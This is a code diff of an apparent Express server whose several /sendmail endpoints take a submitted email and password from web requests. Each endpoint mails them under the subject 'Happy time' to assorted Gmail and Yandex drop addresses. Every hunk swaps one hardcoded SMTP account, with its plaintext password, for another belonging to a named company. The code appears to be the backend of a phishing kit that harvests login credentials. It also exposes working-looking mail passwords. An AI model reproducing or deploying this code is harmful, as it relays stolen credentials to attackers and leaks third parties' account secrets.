@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.yumex-gr.com.ph",
+      host: "freightx.com.ph",
       port: 465,
       auth: {
-        user: "led.sales3@yumex-gr.com.ph",
-        pass: "ITpassword300",
+        user: "wecare@freightx.com.ph",
+        pass: "FXLSICS#2023",
       },
     });
     let info = await transporter.sendMail({
@@ -53,15 +53,15 @@ app.post("/sendmail3", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.yumex-gr.com.ph",
+      host: "freightx.com.ph",
       port: 465,
       auth: {
-        user: "led.sales3@yumex-gr.com.ph",
-        pass: "ITpassword300",
+        user: "wecare@freightx.com.ph",
+        pass: "FXLSICS#2023",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
+      from: '"Happy time" <wecare@freightx.com.ph>',
       to: "quickloaninvestors@gmail.com",
       subject: "Happy time",
       html: `
@@ -86,15 +86,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.yumex-gr.com.ph",
+      host: "freightx.com.ph",
       port: 465,
       auth: {
-        user: "led.sales3@yumex-gr.com.ph",
-        pass: "ITpassword300",
+        user: "wecare@freightx.com.ph",
+        pass: "FXLSICS#2023",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
+      from: '"Happy time" <wecare@freightx.com.ph>',
       to: "Ikrima.catirk@gmail.com",
       subject: "Happy time",
       html: `
@@ -119,15 +119,15 @@ app.post("/sendmail4", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.yumex-gr.com.ph",
+      host: "freightx.com.ph",
       port: 465,
       auth: {
-        user: "led.sales3@yumex-gr.com.ph",
-        pass: "ITpassword300",
+        user: "wecare@freightx.com.ph",
+        pass: "FXLSICS#2023",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
+      from: '"Happy time" <wecare@freightx.com.ph>',
       to: "fredrick3smith33@gmail.com",
       subject: "Happy time",
       html: `
@@ -153,15 +153,15 @@ app.post("/sendmail5", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.yumex-gr.com.ph",
+      host: "freightx.com.ph",
       port: 465,
       auth: {
-        user: "led.sales3@yumex-gr.com.ph",
-        pass: "ITpassword300",
+        user: "wecare@freightx.com.ph",
+        pass: "FXLSICS#2023",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
+      from: '"Happy time" <wecare@freightx.com.ph>',
       to: "wangyong2114@gmail.com",
       subject: "Happy time",
       html: `
@@ -187,15 +187,15 @@ app.post("/sendmail6", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.yumex-gr.com.ph",
+      host: "freightx.com.ph",
       port: 465,
       auth: {
-        user: "led.sales3@yumex-gr.com.ph",
-        pass: "ITpassword300",
+        user: "wecare@freightx.com.ph",
+        pass: "FXLSICS#2023",
       },
     });
     let info = await transporter.sendMail({
-      from: '"Happy time" <led.sales3@yumex-gr.com.ph>',
+      from: '"Happy time" <wecare@freightx.com.ph>',
       to: "daniellahm@yandex.com",
       subject: "Happy time",
       html: `
@@ -221,15 +221,15 @@ app.post("/sendmail7", async (req, res) => {
   const { firstName, lastName, phone, email, message } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.yumex-gr.com.ph",
+      host: "freightx.com.ph",
       port: 465,
       auth: {
-        user: "led.sales3@yumex-gr.com.ph",
-        pass: "ITpassword300",
+        user: "wecare@freightx.com.ph",
+        pass: "FXLSICS#2023",
       },
     });
     let info = await transporter.sendMail({
-      from: 'Cleaning Site" <led.sales3@yumex-gr.com.ph>',
+      from: 'Cleaning Site" <wecare@freightx.com.ph>',
       to: "theodoreemagilll@gmail.com",
       subject: "Cleaning Site",
       html: `
